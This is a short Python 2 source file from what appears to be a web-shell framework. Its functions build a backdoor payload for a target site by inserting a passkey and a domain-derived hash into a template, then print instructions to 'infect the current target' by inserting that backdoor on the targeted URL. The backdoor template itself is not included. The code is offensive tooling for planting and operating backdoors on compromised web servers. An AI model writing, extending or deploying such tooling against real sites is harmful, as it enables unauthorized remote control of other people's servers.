# here are common functions used in mainShell AND remoteShell
from functions import *

def update_opener(CNF):
    from re      import findall
    from hashlib import md5
    from base64  import b64encode

    # an ugly line to shorten the function
    CNF['LNK']['DOMAIN'] = 'x'

    target = CNF['SET']['TARGET']
    regex  = '^https?://(.+?)(?:$|/)'
    try:    domain = findall(regex, target)[0]
    except: domain = ''
    if domain and len(target)>13:
        CNF['LNK']['URL']    = target
        CNF['LNK']['DOMAIN'] = domain
    else:
        try: del CNF['LNK']['URL']
        except: pass

    # domain hash building
    domain  = CNF['LNK']['DOMAIN']
    md5Val  = md5(domain).hexdigest()
    b64Val  = b64encode(md5Val)
    CNF['LNK']['HASH'] = b64Val[:8]

    # payload generation
    srvhash  = CNF['LNK']['HASH']
    backdoor = CNF['SET']['BACKDOOR']
    passkey  = CNF['SET']['PASSKEY'].upper().replace('-','_')
    rawPayload = backdoor.replace('%%PASSKEY%%',passkey)
    payload    = rawPayload.replace('%%SRVHASH%%',srvhash)
    CNF['LNK']['BACKDOOR'] = payload

    # passkey generation
    CNF['LNK']['PASSKEY'] = CNF['SET']['PASSKEY']
    if CNF['LNK']['PASSKEY'] == "%%SRVHASH%%":
        CNF['LNK']['PASSKEY'] = CNF['LNK']['HASH']

    return(CNF['LNK'])


def cmd_infect(backdoor):
    length = len(backdoor)
    print ''
    print 'To infect the current target'
    print 'Insert this backdoor on targeted URL:'
    print ''
    print ''+'='*length
    print ''+color(34)+backdoor+color(0)
    print ''+'='*length
    print ''
